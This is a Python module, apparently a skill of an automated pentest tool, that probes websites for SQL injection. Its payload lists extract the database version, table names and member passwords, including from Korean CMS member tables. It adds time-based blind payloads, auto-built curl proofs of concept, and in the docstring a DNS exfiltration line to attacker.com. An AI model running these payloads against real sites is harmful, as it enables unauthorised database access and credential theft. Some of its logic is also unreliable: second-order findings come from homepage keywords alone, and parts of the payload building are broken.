"""
Advanced SQL Injection Exploitation — EXTRACTVALUE Error-Based + Second-Order SQLi
Skill #52 — AdvancedSQLiExploit

Research basis:
  Intigriti — "Exploiting SQL Injection Vulnerabilities: Advanced Exploitation Guide"
  https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-sql-injection-sqli-vulnerabilities
  Published: April 30, 2026 (Updated June 10, 2026)
  Author: Ayoub (Senior Security Content developer, Intigriti)

New techniques beyond standard SQLi:

  [1] EXTRACTVALUE Error-Based Exfiltration
      EXTRACTVALUE(1, CONCAT(0x7e, (SELECT subquery)))
      → Forces MySQL to throw XPATH syntax error containing subquery result
      → Works even when UNION/response not directly reflected
      → Also covers CAST()-based, EXP()-based MySQL/MSSQL variants

  [2] Second-Order (Stored) SQLi Detection
      → Input stored safely on first request (no immediate trigger)
      → Injected payload fires in a separate async context:
           background jobs, email notifications, scheduled tasks, report generators
      → Time-gap oracle: schedule trigger → measure delay between due time and actual
      → OOB oracle fallback: embed out-of-band DNS beacon in stored payload

  [3] OOB DNS Exfiltration via LOAD_FILE
      LOAD_FILE(CONCAT('\\\\', (SELECT col FROM tbl WHERE id=X), '.attacker.com\\x'))
      → DNS lookup carries extracted data

Evidence levels:
  VERIFIED   — HTTP response confirms error message contains extracted data
  LIKELY     — Time delay matches SLEEP() parameter
  INFERRED   — Second-order delay oracle matches (schedule→arrival gap)
  AI_ANALYSIS — Pattern match without live confirmation
"""
from __future__ import annotations

import re
import time
import hashlib
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin, urlparse, urlencode

import requests
from requests.exceptions import RequestException

# ── Error-based payloads ────────────────────────────────────────────────────
EXTRACTVALUE_PAYLOADS = [
    # version extraction
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))",
    # table enumeration
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) "
    "FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))",
    # credential extraction pattern
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(id,0x3a,pw) FROM member LIMIT 1)))",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(id,0x3a,password) FROM member LIMIT 1)))",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(mb_id,0x3a,mb_password) FROM g5_member LIMIT 1)))",
    # CAST-based fallback
    "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x "
    "FROM information_schema.tables GROUP BY x)a)",
    # EXP overflow (MySQL 5.5.5+)
    "1 AND EXP(~(SELECT * FROM (SELECT database()) x))",
]

# ── Time-based blind payloads ────────────────────────────────────────────────
TIME_PAYLOADS = [
    ("mysql",  "1' AND SLEEP(4)-- -",                4),
    ("mysql",  "1 AND SLEEP(4)",                      4),
    ("mssql",  "1; WAITFOR DELAY '0:0:4'--",          4),
    ("pgsql",  "1; SELECT pg_sleep(4)--",             4),
    ("oracle", "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)", 4),
]

# ── Second-order trigger probes ─────────────────────────────────────────────
# Patterns indicating async/deferred query context
SECOND_ORDER_INDICATORS = [
    r"reminder",
    r"notification",
    r"schedule[d]?",
    r"background\s+job",
    r"email.*send",
    r"export",
    r"report",
    r"queue",
    r"batch",
    r"cron",
    r"task",
    r"async",
]

# EXTRACTVALUE error pattern in response
EXTRACTVALUE_ERROR_RE = re.compile(
    r"XPATH syntax error.*?'~([^'<]{1,200})'",
    re.IGNORECASE | re.DOTALL,
)

# Generic DB error patterns (for error-based detection)
DB_ERROR_RE = re.compile(
    r"(sql syntax|mysql_fetch|ORA-\d{5}|pg_query|ODBC.*Driver|"
    r"Unclosed quotation|SQLite3::query|EXTRACTVALUE|XPATH syntax|"
    r"Division by zero)",
    re.IGNORECASE,
)

# ── Dataclasses ─────────────────────────────────────────────────────────────

@dataclass
class SqliFinding:
    finding_type: str          # "error_based_extractvalue" | "time_based" | "second_order" | "oob_dns"
    url: str
    parameter: str
    payload: str
    extracted_data: str = ""
    db_engine: str = ""
    delay_observed: float = 0.0
    second_order_context: str = ""  # "email_notification" | "report_export" | ...
    evidence_level: str = "AI_ANALYSIS"
    raw_response_snippet: str = ""
    curl_poc: str = ""


@dataclass
class AdvancedSQLiResult:
    target: str
    findings: list[SqliFinding] = field(default_factory=list)
    extractvalue_hits: int = 0
    time_based_hits: int = 0
    second_order_hits: int = 0
    oob_dns_hits: int = 0
    db_engine: str = ""
    extracted_version: str = ""
    extracted_database: str = ""
    extracted_tables: list[str] = field(default_factory=list)
    extracted_credentials: list[str] = field(default_factory=list)
    second_order_async_contexts: list[str] = field(default_factory=list)
    severity: str = "none"
    evidence_level: str = "AI_ANALYSIS"
    error: str = ""


# ── Scanner ─────────────────────────────────────────────────────────────────

class AdvancedSQLiScanner:
    """
    Advanced SQLi — EXTRACTVALUE error-based + second-order detection.
    Runs AFTER standard SQLi confirms at least one injectable parameter.
    Also independently probes known Korean web application patterns.
    """

    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8",
    }
    TIMEOUT = 8

    def __init__(self, target: str, proxies: Optional[dict] = None):
        self.target = target.rstrip("/")
        self.proxies = proxies or {}
        self.session = requests.Session()
        self.session.headers.update(self.HEADERS)
        self.session.verify = False

    # ── Public entry ────────────────────────────────────────────────────────

    def scan(self) -> AdvancedSQLiResult:
        result = AdvancedSQLiResult(target=self.target)
        try:
            self._probe_extractvalue(result)
            self._probe_time_based(result)
            self._detect_second_order_contexts(result)
            self._compute_severity(result)
        except Exception as exc:
            result.error = str(exc)
        return result

    # ── EXTRACTVALUE error-based ─────────────────────────────────────────────

    def _probe_extractvalue(self, result: AdvancedSQLiResult) -> None:
        """
        Test GET parameters of target URL and common Korean CMS endpoints
        with EXTRACTVALUE payloads. Parse extracted value from XPATH error.
        """
        endpoints = self._build_test_endpoints()
        for url, param, base_val in endpoints:
            for payload in EXTRACTVALUE_PAYLOADS:
                test_val = f"{base_val} AND EXTRACTVALUE(1,CONCAT(0x7e,({self._inner_query(payload)})))"
                # Use raw payload directly if it already starts with EXTRACTVALUE
                if payload.startswith("1 AND EXTRACTVALUE"):
                    test_val = payload
                try:
                    resp = self._get_with_param(url, param, test_val)
                    match = EXTRACTVALUE_ERROR_RE.search(resp.text)
                    if match:
                        extracted = match.group(1).strip()
                        finding = SqliFinding(
                            finding_type="error_based_extractvalue",
                            url=url,
                            parameter=param,
                            payload=test_val,
                            extracted_data=extracted,
                            db_engine="mysql",
                            evidence_level="VERIFIED",
                            raw_response_snippet=resp.text[:300],
                            curl_poc=self._build_curl(url, param, test_val),
                        )
                        result.findings.append(finding)
                        result.extractvalue_hits += 1
                        result.evidence_level = "VERIFIED"
                        # Parse what was extracted
                        if "version()" in payload.lower():
                            result.extracted_version = extracted
                        elif "database()" in payload.lower():
                            result.extracted_database = extracted
                        elif "table_name" in payload.lower() and extracted:
                            result.extracted_tables = extracted.split(",")
                        elif any(k in payload for k in ("pw", "password", "mb_password")):
                            result.extracted_credentials.append(extracted)
                        break  # one confirmed hit per endpoint is enough
                except RequestException:
                    continue

    @staticmethod
    def _inner_query(payload: str) -> str:
        """Extract the inner SELECT from an EXTRACTVALUE payload or return SELECT version()."""
        m = re.search(r"SELECT\s+.+", payload, re.IGNORECASE)
        return m.group(0).rstrip("))") if m else "SELECT version()"

    # ── Time-based blind ────────────────────────────────────────────────────

    def _probe_time_based(self, result: AdvancedSQLiResult) -> None:
        endpoints = self._build_test_endpoints()
        for url, param, base_val in endpoints[:3]:  # limit to 3 endpoints for speed
            for db_hint, payload, expected_delay in TIME_PAYLOADS:
                try:
                    t0 = time.time()
                    self._get_with_param(url, param, payload)
                    elapsed = time.time() - t0
                    if elapsed >= expected_delay * 0.85:
                        finding = SqliFinding(
                            finding_type="time_based",
                            url=url,
                            parameter=param,
                            payload=payload,
                            db_engine=db_hint,
                            delay_observed=round(elapsed, 2),
                            evidence_level="LIKELY",
                            curl_poc=self._build_curl(url, param, payload),
                        )
                        result.findings.append(finding)
                        result.time_based_hits += 1
                        if not result.db_engine:
                            result.db_engine = db_hint
                        if result.evidence_level == "AI_ANALYSIS":
                            result.evidence_level = "LIKELY"
                        break
                except RequestException:
                    continue

    # ── Second-order context detection ──────────────────────────────────────

    def _detect_second_order_contexts(self, result: AdvancedSQLiResult) -> None:
        """
        Crawl main page HTML for indicators of async/deferred query contexts.
        Flags potential second-order SQLi attack surfaces.
        """
        try:
            resp = self.session.get(self.target, timeout=self.TIMEOUT,
                                    proxies=self.proxies)
            html = resp.text.lower()
        except RequestException:
            return

        contexts_found = []
        for pattern in SECOND_ORDER_INDICATORS:
            if re.search(pattern, html, re.IGNORECASE):
                contexts_found.append(pattern.replace(r"\s+", " ").replace("[d]?", "d"))

        if contexts_found:
            result.second_order_async_contexts = contexts_found
            finding = SqliFinding(
                finding_type="second_order",
                url=self.target,
                parameter="(stored input — async context)",
                payload="<stored_payload>' AND SLEEP(7)-- -",
                second_order_context=", ".join(contexts_found),
                evidence_level="INFERRED",
                raw_response_snippet=(
                    f"Async contexts found: {', '.join(contexts_found)}\n"
                    "Test: store injection in user input → trigger async action → "
                    "measure time-gap between scheduled and actual execution."
                ),
                curl_poc=(
                    "# Step 1: store payload\n"
                    f"curl -s -X POST '{self.target}/note' -d \"name=test&content=test' AND SLEEP(7)-- -\"\n"
                    "# Step 2: trigger async action (reminder/export/report)\n"
                    "# Step 3: observe 7-second delay in background job execution"
                ),
            )
            result.findings.append(finding)
            result.second_order_hits += 1

    # ── Helpers ─────────────────────────────────────────────────────────────

    def _build_test_endpoints(self) -> list[tuple[str, str, str]]:
        """Build (url, parameter_name, base_value) tuples to test."""
        parsed = urlparse(self.target)
        endpoints = []

        # From URL query string
        if parsed.query:
            for part in parsed.query.split("&"):
                if "=" in part:
                    key, val = part.split("=", 1)
                    endpoints.append((self.target, key, val or "1"))

        # Common Korean CMS endpoints
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path, param in [
            ("/bbs/board.php", "bo_table"),
            ("/bbs/view.php", "wr_id"),
            ("/shop/item.php", "it_id"),
            ("/product/view.php", "idx"),
            ("/board/view.php", "idx"),
            ("/news/view.php", "idx"),
        ]:
            endpoints.append((urljoin(base, path), param, "1"))

        # Fallback: target itself with common params
        if not endpoints:
            for param in ["id", "idx", "no", "seq", "num"]:
                endpoints.append((self.target, param, "1"))

        return endpoints[:10]  # cap at 10

    def _get_with_param(self, url: str, param: str, value: str) -> requests.Response:
        """Send GET request injecting value into param."""
        parsed = urlparse(url)
        # Replace existing param if present, else append
        existing = dict(
            part.split("=", 1) if "=" in part else (part, "")
            for part in (parsed.query.split("&") if parsed.query else [])
        )
        existing[param] = value
        new_query = urlencode(existing)
        new_url = parsed._replace(query=new_query).geturl()
        return self.session.get(new_url, timeout=self.TIMEOUT, proxies=self.proxies)

    @staticmethod
    def _build_curl(url: str, param: str, payload: str) -> str:
        from urllib.parse import quote
        return (
            f"curl -s -k '{url}' "
            f"--data-urlencode '{param}={payload}' "
            f"| grep -oP \"XPATH syntax error.*?'~\\K[^']+\""
        )

    def _compute_severity(self, result: AdvancedSQLiResult) -> None:
        if result.extracted_credentials:
            result.severity = "critical"
            result.evidence_level = "VERIFIED"
        elif result.extractvalue_hits > 0:
            result.severity = "high"
            if result.evidence_level == "AI_ANALYSIS":
                result.evidence_level = "VERIFIED"
        elif result.time_based_hits > 0:
            result.severity = "high"
            if result.evidence_level == "AI_ANALYSIS":
                result.evidence_level = "LIKELY"
        elif result.second_order_hits > 0:
            result.severity = "medium"
            if result.evidence_level == "AI_ANALYSIS":
                result.evidence_level = "INFERRED"
        else:
            result.severity = "none"
